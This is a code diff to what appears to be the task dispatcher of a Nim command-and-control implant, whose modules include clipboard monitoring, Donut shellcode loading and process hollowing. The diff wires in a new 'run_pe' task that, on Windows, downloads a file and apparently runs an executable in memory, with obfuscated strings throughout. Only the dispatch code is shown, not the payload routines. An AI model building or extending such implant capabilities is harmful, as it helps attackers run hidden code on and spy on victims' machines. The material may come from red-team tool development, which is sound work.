@@ -66,6 +66,7 @@ when defined(windows):
   import ../tasks/clipboard_monitor
   import ../tasks/donut
   import ../tasks/inject_hollow
+  import ../tasks/run_pe
 
 type
   TaskExecutionResult* = object
@@ -587,6 +588,19 @@ proc executeTask*(taskId: string, command: string, params: JsonNode): TaskExecut
           obf("completed"): true,
           obf("status"): "error",
           obf("user_output"): obf("clipboard_monitor command is only available on Windows")
+        }
+    
+    of obf("run_pe"):
+      when defined(windows):
+        debug "[DEBUG] Starting run_pe (file download)"
+        result.response = run_pe(taskId, params)
+        result.needsBackgroundTracking = true
+      else:
+        result.response = %*{
+          obf("task_id"): taskId,
+          obf("completed"): true,
+          obf("status"): "error",
+          obf("user_output"): obf("run_pe command is only available on Windows")
         }
     
     else:
